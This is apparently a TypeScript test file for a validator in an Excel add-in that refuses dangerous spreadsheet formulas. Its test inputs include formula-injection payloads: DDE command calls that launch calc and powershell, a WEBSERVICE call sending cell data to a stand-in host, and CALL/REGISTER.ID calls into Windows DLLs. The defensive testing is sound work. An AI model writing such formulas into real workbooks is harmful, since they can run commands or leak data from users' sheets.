import test from "node:test";
import assert from "node:assert/strict";
import { findUnsafeFormula, unsafeFormulaMessage, unsafeFormulaReason } from "./formulaSafety";

test("DDE, WEBSERVICE and DLL calls are refused; ordinary formulas pass", () => {
  // Разбор проекта 07.10.2026: формулы при isFormula=true не проверялись вовсе.
  assert.match(unsafeFormulaReason("=CMD|'/c calc'!A1") ?? "", /DDE/);
  assert.match(unsafeFormulaReason("=cmd|' /C powershell'!'A1'") ?? "", /DDE/);
  assert.match(unsafeFormulaReason('=WEBSERVICE("https://x.example/?d="&A1)') ?? "", /WEBSERVICE/);
  assert.match(unsafeFormulaReason("=_xlfn.WEBSERVICE(B2)") ?? "", /WEBSERVICE/);
  assert.match(unsafeFormulaReason('=CALL("kernel32","WinExec","JCJ","calc",0)') ?? "", /CALL/);
  assert.match(unsafeFormulaReason('=REGISTER.ID("user32","MessageBoxA")') ?? "", /REGISTER\.ID/);
  assert.match(unsafeFormulaReason('=RTD("srv",,"x")') ?? "", /RTD/);

  for (const formula of [
    "=SUM(A1:A10)",
    '=IF(A1="a|b","да","нет")',
    '=TEXTJOIN("|",TRUE,A1:A3)',
    '=HYPERLINK("https://example.com","сайт")',
    "=VLOOKUP(B2,Отделы!$A$2:$B$5,2,FALSE)",
    "=RECALL(A1)",
    "=MYCALL(1)"
  ]) assert.equal(unsafeFormulaReason(formula), null, formula);
  assert.equal(unsafeFormulaReason("CMD|'/c calc'!A1"), null, "не формула — обычный текст, его защищает апостроф");
  assert.equal(unsafeFormulaReason(42), null);
});

test("the refusal names the formula and says nothing was written", () => {
  const found = findUnsafeFormula(["=SUM(A1:A2)", "=CMD|'/c calc'!A1"]);
  assert.deepEqual(found?.formula, "=CMD|'/c calc'!A1");
  assert.match(unsafeFormulaMessage(found!), /не записывает.*Операция не выполнялась/s);
});

test("every formula write is stopped before Excel is touched", async () => {
  const { planFunctionCheck } = await import("./excelTools");
  const untouched: any = new Proxy({}, { get() { throw new Error("к Excel обращаться было нельзя"); } });
  await assert.rejects(
    () => planFunctionCheck(untouched, untouched, { rowIndex: 0, columnIndex: 0, columnCount: 1 }, ["=SUM(A1)", '=WEBSERVICE("https://x.example")']),
    /WEBSERVICE.*Операция не выполнялась/s
  );
});
